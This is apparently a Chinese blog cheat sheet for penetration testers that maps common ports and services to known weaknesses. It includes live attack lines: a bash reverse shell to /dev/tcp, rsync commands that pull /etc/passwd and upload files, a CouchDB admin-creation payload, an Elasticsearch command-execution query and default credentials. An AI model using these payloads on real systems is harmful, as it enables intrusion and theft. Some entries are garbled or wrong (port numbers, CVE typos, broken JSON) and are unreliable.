title: 常见的端口和对应的服务
author: liuGuobin
tags:
  - 日报
categories:
  - 日报
date: 2023-07-12 20:07:00
---
#### web类
**struts2：**
太多，略......

**thinkphp：**
<a href="https://smms.app/image/AtUjGFfCBWR9mxz" target="_blank"><img src="https://s2.loli.net/2023/07/19/AtUjGFfCBWR9mxz.png" ></a>

**jboss：**
<a href="https://smms.app/image/1sElFjNxyCQTUdw" target="_blank"><img src="https://s2.loli.net/2023/07/19/1sElFjNxyCQTUdw.png" ></a>

**ganglia：**
CVE-2007-6465: 多个跨站脚本攻击漏洞
CVE-2012-3448: 未明PHP代码执行漏洞
8649端口未授权访问: 通过http协议获取相关监控的xml信息
nmap扫描脚本  `nmap --script ganglia-info --script-args ganglia-info.timeout=60,ganglia-info.bytes=100000 -p`

**zabbix：**
弱口令/默认账号: 
```
admin:zabbix
Admin:zabbix
guest: 空
```
ave-2016-10134: sql注入
系统命令执行: 管理员登录后Administrator-script-createscript
```
bash -i >& /dev/tcp/ip/端口 0>&1
```


#### 数据库类（扫描弱口令）
**MSSQL**
```

默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）
攻击方法：
    爆破：弱口令/使用系统用户
    注入
参考：
    https://www.anquanke.com/post/id/86011
```

**Oracle**
```

默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）
攻击方法：
    爆破：弱口令
    注入攻击；
    漏洞攻击；
    -参考：
    https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html
```

**MySQL**
```

默认端口：3306
攻击方法：
    爆破：弱口令
    身份认证漏洞：CVE-2012-2122
    拒绝服务攻击
    Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意
    提权
参考：
    https://www.seebug.org/appdir/MySQL
    http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390
    https://xz.aliyun.com/t/1491
```

**PostgreSQL**
```

默认端口：5432
攻击方法：
    爆破：弱口令：postgres postgres
    缓冲区溢出：CVE-2014-2669
参考：
    http://drops.xmd5.com/static/drops/tips-6449.html
    https://www.secpulse.com/archives/69153.html
```

**MongoDB**
```

默认端口：27017
攻击方法：
    爆破：弱口令
    未授权访问；github有攻击代码；请点击
参考：
    http://www.cnblogs.com/LittleHann/p/6252421.html
    http://www.tiejiang.org/19157.html
```

**Redis**
```

攻击方法：
    爆破：弱口令
    未授权访问+配合ssh key提权；
参考：
    http://www.alloyteam.com/2017/07/12910/
```

**SysBase**
```

默认端口：服务端口5000；监听端口4100；备份端口：4200
攻击方法：
    爆破：弱口令
    命令注入：
```

**DB2**
```

默认端口：5000
攻击方法：
    安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）
参考：
    http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071
```


#### 特殊服务类（未授权/命令执行/漏洞）
**443 SSL心脏滴血**
该落地是一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。
攻击原理是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），导致可以读取的数据比应该允许读取的还多。
利用该漏洞，攻击者可以远程读取服务器内存中64K的数据，获取内存中的敏感信息。

**873 Rsync未授权**
rsync是Linux/Unix下的一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件和目录。
由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件。
```

【列目录】
rsync --port=xxx ip::
rsync rsync://192.168.241.142:873/

【看目录】
rsync --port=xxx ip::目录名
rsync rsync://192.168.241.142:873/src/

【文件下载】
rsync --port=xxx ip::目录名 ./
rsync -av rsync://192.168.241.142:873/src/etc/passwd ./

【文件写入】
rsync -av muma.txt rsync://192.168.241.142:873/src/target.txt
利用文件上传设置计划任务来反弹shell
```

**5984 CouchDB未授权**

CVE-2017-12635权限绕过：到/_utils 目录下验证登陆,后续使用反弹shell进行进一步利用
```
PUT /_users/org.couchdb.user:vulhub
{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulhub"
}
```

**6379 redis未授权**
`./redis-cli -h ip`  直接连接就行了

**7001、7002 weblogic默认弱口令、反序列化**
```

【登录页面】
http://ip:7001/console/login/LoginForm.jsp
【默认密码】
weblogic Oracle@123
【反序列化漏洞】
http://ip:7001/_async/AsyncResponseService
```

**9200、9300 ElasticSearch未授权、命令执行漏洞**
```

【未授权】
http://localhost:9200/rvier/search 查看敏感信息了
 
http://localhost:9200/_plugin/head/ web管理界面
 
http://localhost:9200/_cat/indices 查看所有的index
 
http://localhost:9200/river/search 查看数据库敏感信息
 
http://localhost:9200/_nodes 查看节点数据

【命令执行】
POST /_search?pretty HTTP/1.1

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
    }
}
```

**11211 memcache未授权访问**
`telnet ip port` 直接连接

**50000 SAP命令执行**
```

https://XXX/ctc/servlet/ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=id
```

**50070、50030 hadoop默认端口未授权访问**
```

http://ip:port/cluster
后续上传文件反弹shell利用
```


#### 常见的端口漏洞
| 端口 | 服务   | 描述                                                         |
|------|--------|--------------------------------------------------------------|
| 21   | ftp    | FTP服务端，存在匿名未授权访问和爆破风险                        |
| 22   | ssh    | SSH服务端，存在root密码爆破和后门用户的风险                      |
| 23   | telnet | Telnet服务端，常见于路由器、交换机和嵌入式设备，存在弱口令风险     |
| 25   | smtp   | SMTP服务端，可能存在默认用户和默认密码，需要防止邮件账号爆破     |
| 80   | http   | HTTP Web服务，常见的漏洞包括中间件反序列化、FastCGI配置不当等    |
| 110  | pop3   | POP3服务端，可能存在默认用户和默认密码，需要防止邮件账号爆破     |
| 443  | https  | HTTPS服务端，可能受影响的漏洞包括OpenSSL的心脏滴血和SSL/TLS低版本漏洞 |
| 135  | netbios smb   | NetBIOS SMB服务，可能受到MS17010漏洞的威胁                   |
| 139  | netbios smb   | NetBIOS SMB服务，可能受到MS17010漏洞的威胁                   |
| 445  | netbios smb   | NetBIOS SMB服务，可能受到MS17010漏洞的威胁                   |
| 3389 | RDP    | RDP服务，可能受CVE-2019-0708漏洞的影响                      |


#### 汇总
| 端口 | 对应的服务                                                | 存在的相关漏洞                               |
| ---- | --------------------------------------------------------- | -------------------------------------------- |
| 21/69 | ftp/tftp：文件传输协议                                    | 爆破,嗅探溢出,后门,匿名访问                 |
| 22   | ssh                                                       | 爆破,openssh漏洞                             |
| 23   | telnet：远程连接                                          | 爆破嗅探                                     |
| 25   | smtp：邮件服务                                            | 弱口令,未授权访问,邮件伪造                   |
| 53   | dns：域名系统                                              | dns区域传输,劫持,缓存投毒,隧道技术刺透防火墙 |
| 80/8080 | apache/tomcat/nginx/axis2                               | 爆破弱口令,http慢速攻击,解析漏洞             |
| 80/443/8080 | web                                              | 常见web攻击,控制台爆破,对应服务器版本漏洞     |
| 80/81/443 | IIS                                                  | put写文件,短文件名漏洞,解析漏洞               |
| 110  | pop3                                                      | 弱口令                                       |
| 123  | ntp                                                       | ntp放大攻击                                 |
| 137/139 | samba                                                  | 爆破,未授权访问,远程代码执行                 |
| 143  | imap                                                      | 弱口令                                       |
| 1521 | oracle                                                    | 爆破注入攻击                                 |
| 161  | snmp                                                      | 爆破                                         |
| 389  | ladp                                                      | 注入攻击,未授权访问,爆破                     |
| 443  | https                                                     | 心脏滴血                                     |
| 445  | smb                                                       | 溢出漏洞                                     |
| 512  | linux r                                                   | rlogin远程登录                               |
| 873  | rsync                                                     | 未授权访问                                   |
| 1080 | socket                                                    | 爆破:进行内网渗透                           |
| 1098 | javarmi                                                   | 命令执行                                     |
| 1352 | lotus                                                     | 爆破信息泄露跨站脚本攻击                     |
| 1433 | mssql                                                     | 爆破,注入攻击                               |
| 2049 | nfs                                                       | 未授权访问                                   |
| 2181 | zookeeper                                                 | 未授权访问                                   |
| 2222 | da                                                        | da虚拟主机                                  |
| 2601 | zebra                                                     | 默认密码                                     |
| 3128 | squid                                                     | 空口令                                       |
| 3306 | mysql                                                     | 漏洞：爆破,拒绝服务,注入                     |
| 3389 | rdp/windows远程连接                                        | 爆破,shift后门,3389漏洞攻击                 |
| 4100 | sysbase                                                   | 弱口令                                       |
| 4440 | rundeck                                                   | 弱口令                                       |
| 4848 | glassfish                                                 | 爆破认证绕过                                 |
| 5000 | sybase/db2                                                | 弱口令命令,注入                               |
| 5422 | postgresql                                                | 弱口令                                       |
| 5432 | postgresql                                                | 缓冲区溢出,注入攻击,爆破                     |
| 5632 | pcanywhere                                                | 拒绝服务,代码执行                           |
| 5900 | vnc                                                       | 爆破,认证口令绕过,拒绝服务攻击,权限提升       |
| 5984 | couchdb                                                   | 命令执行                                     |
| 6082 | varnish                                                   | 未授权访问                                   |
| 6379 | redis                                                     | 弱口令,未授权访问                           |
| 7001 | weblofic                                                  | 爆破,弱口令(system/system,weblogic/weblogic),congsole后台部署webshell,java反序列化泄漏源代码/列目录,ssrf窥探内网,命令执行 |
| 8000 | jdwp                                                      | 命令执行                                     |
| 8069 | zabbix                                                    | 命令执行                                     |
| 8080 | apache/tomcat/nginx/axis2/jboss中间件                      | 弱口令命令执行                               |
| 8080 | jboss,其他端口：1098/1099/4444/4445/8080/8009/8083/8093   | 爆破,远程代码执行,java反序列化               |
| 8080 | glassfish,其他端口：iiop：3700；控制台：4848               | 爆破,任意文件读取,认证绕过                   |
| 8080 | resin                                                     | 目录遍历,远程代码执行                         |
| 8080/8089 | jenkis                                               | 爆破,未授权访问,反序列化                     |
| 8080 | jetty                                                     | 远程共享,缓冲区溢出                           |
| 8161 | activemq                                                  | 文件上传                                     |
| 8649 | ganglia                                                   | 未授权访问,信息泄露                           |
| 8980 | opennms                                                   | 反序列化漏洞                                 |
| 9080 | websphere                                                 | 弱口令,反序列化,文件泄露                     |
| 9090 | websphere                                                 | 控制台爆破,反序列化java                       |
| 9200/9300 | elasticsearch                                       | 远程代码执行,未授权访问                       |
| 11211 | memcache                                                | 未授权访问                                   |
| 11211 | memcacache                                               | 未授权访问                                   |
| 27017 | mongodb                                                  | 未授权访问                                   |
| 27017 | mongodb                                                  | 爆破,未授权                                 |
| 27018 | mongodb                                                  | 未授权                                       |
| 50000 | sap                                                      | 命令执行                                     |
| 50010 | hadoop                                                   | 信息泄露命令执行                             |
| 50030 | hadoop                                                   | 未授权访问                                   |
| 50070 | hadoop                                                   | 未授权访问                                   |
| 512/513/514 | linux r                                             | 直接使用rlogin                               |
| 67/68 | dhcp                                                     | 劫持欺骗                                     |

**注意：端口可能会被更改或隐藏以达到防御目的**
**这个时候就需要进行端口爆破**